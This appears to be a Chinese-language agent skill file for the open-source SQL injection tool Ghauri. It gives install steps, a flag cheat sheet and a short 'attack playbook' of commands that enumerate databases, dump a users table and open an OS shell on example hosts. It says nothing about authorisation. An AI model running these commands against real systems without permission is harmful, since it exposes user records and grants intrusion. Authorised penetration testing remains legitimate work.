---
name: ghauri-sqli-detect
description: 渗透工具 skill:Ghauri 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(SQL注入) 需要调用 Ghauri 时使用。
when-to-use: 渗透工具 skill:Ghauri 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(SQL注入) 需要调用 Ghauri 时使用。
---

# Ghauri

- 攻击大类:C09 Web利用(SQL注入)
- 上游仓库:https://github.com/r0oth3x49/ghauri
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install ghauri
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `ghauri -u 'https://t.com/page?id=1'` | 注入检测+类型识别 |
| `--dbs` | 枚举数据库名 |
| `-D db --tables` | 枚举表 |
| `-D db -T users --dump` | 拖库 |
| `--batch --level 3` | 非交互+深度提升 |
| `--current-user --is-dba` | 当前用户与 DBA 判断 |
| `-r req.txt -p id` | 从请求文件指定参数 |
| `--os-shell` | 堆叠注入取系统 shell |

## 攻击场景 Playbook

### 常规参数注入拖库

```bash
ghauri -u 'https://shop.t.com/item.php?id=12' --batch --dbs
ghauri -u 'https://shop.t.com/item.php?id=12' -D shop -T users --dump
```

## 注意事项

sqlmap 的现代替代,Python3,支持请求文件/HTTP2,语法与 sqlmap 高度相似。
